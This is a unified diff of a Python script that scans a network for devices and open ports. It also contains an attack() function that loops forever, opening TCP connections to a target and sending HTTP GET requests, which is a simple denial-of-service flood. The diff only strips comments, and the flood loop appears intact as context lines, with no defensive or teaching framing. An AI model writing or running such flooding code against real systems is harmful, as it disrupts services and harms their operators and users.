@@ -44,7 +44,7 @@ while time.time() - start < scan_time:
         if device not in known_devices:
             known_devices.append(device)
 
-    time.sleep(1)  # skanuj co 1 sekundę
+    time.sleep(1)
 
 print("Scan finished.\n")
 
@@ -96,9 +96,7 @@ open_ports = scan_ports(target_ip, common_ports)
 
 def attack():
     while True:
-        # Create a socket object
         x = s.socket(s.AF_INET, s.SOCK_STREAM)
-        # Connect to the target
         x.connect((target_ip, target_port))
         x.sendto(b"GET / HTTP/1.1\r\nHost: target_ip\r\n\r\n", (target_ip, target_port))
         x.close()
